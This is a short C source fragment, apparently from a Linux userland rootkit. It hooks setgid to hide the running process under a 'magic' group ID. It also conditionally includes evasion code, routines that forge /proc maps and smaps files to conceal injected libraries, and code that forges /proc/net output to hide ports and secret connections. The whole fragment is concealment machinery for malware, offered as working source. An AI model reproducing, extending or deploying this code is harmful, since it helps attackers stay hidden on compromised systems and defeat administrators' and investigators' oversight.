#include "files/files.h"

#ifdef DO_EVASIONS
#include "evasion/evasion.h"
#endif

#ifdef FORGE_MAPS
FILE *forge_maps(const char *pathname);
FILE *forge_smaps(const char *pathname);
FILE *forge_numamaps(const char *pathname);
#include "mapsforge.c"
#endif

#ifdef HIDE_PORTS
int is_hidden_port(int port);
int secret_connection(char line[]);
int hideport_alive(void);
FILE *forge_procnet(const char *pathname);
#include "procnetforge.c"
#endif


void _setgid(gid_t gid){
    hook(CSETGID);
    call(CSETGID, gid);
}

void hide_self(void){
#ifndef HIDE_SELF
    return;
#endif

    gid_t magicgid = readgid();
    if(not_user(0) || getgid() == magicgid) return;
    _setgid(magicgid);
}

void unhide_self(void){
#ifndef HIDE_SELF
    return;
#endif

    if(not_user(0) || getgid() == 0) return;
    _setgid(0);
}